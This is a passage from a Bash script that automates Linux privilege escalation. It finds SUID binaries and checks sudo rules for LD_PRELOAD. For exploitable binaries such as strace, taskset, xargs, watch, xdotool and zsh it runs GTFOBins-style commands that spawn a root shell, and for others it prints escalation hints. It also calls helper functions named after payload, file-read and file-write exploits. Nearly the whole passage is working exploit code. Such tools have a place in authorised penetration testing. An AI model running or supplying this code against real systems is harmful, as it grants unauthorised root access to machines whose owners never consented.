        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'stdbuf\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            stdbuf -i0 /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v strace)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'strace\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            strace -o /dev/null /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v systemctl)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'systemctl\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/systemctl/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v taskset)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'taskset\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            taskset 1 /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v tclsh)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'tclsh\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            tclsh
            exit
        fi
    fi

    binary=$(command -v time)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'time\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            \time /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v timeout)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'timeout\' has its SUID bit turned on. Obtain a root shell by executing the following command:\ntimeout 7d /bin/sh -p\e[0m'
        fi
    fi

    binary=$(command -v unshare)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'unshare\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            unshare -r /bin/sh
            exit
        fi
    fi

    binary=$(command -v unzip)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'unzip\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/unzip/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v view)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'view\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/view/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v vigr)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'vigr\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/vigr/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v vim)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'vim\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/vim/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v vimdiff)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'vimdiff\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/vimdiff/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v vipw)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'vipw\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/vipw/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v watch)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'watch\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
            exit
        fi
    fi

    binary=$(command -v xargs)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'xargs\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            xargs -a /dev/null sh -p
            exit
        fi
    fi

    binary=$(command -v xdotool)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'xdotool\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            xdotool exec --sync /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v yash)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'yash\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            yash
            exit
        fi
    fi

    binary=$(command -v zsh)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'zsh\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            zsh
            exit
        fi
    fi

    if [[ $rootVulnerableFound -eq 0 ]]; then
        echo $'\n\e[31mNo root shell vulnerabilities found.'
    fi

}

declare -A usersBinaries

if sudo -l | grep -q "env_keep+=LD_PRELOAD"; then
    echo "env_keep+=LD_PRELOAD is set."
    ld_payload_exploit
fi

    echo "Binaries with suid bit set:"

    # Use find to search for files with the suid bit set and filter for executable files
    while read binary; do
        BINARY_NAME=$(basename "$binary")
        echo "$BINARY_NAME"
        usersBinaries["$BINARY_NAME"]=1
    done < <(find / -type f -perm -04000 2>/dev/null)

read_file_exploit

write_file_exploit

command_exploit

root_shell_exploit

exit
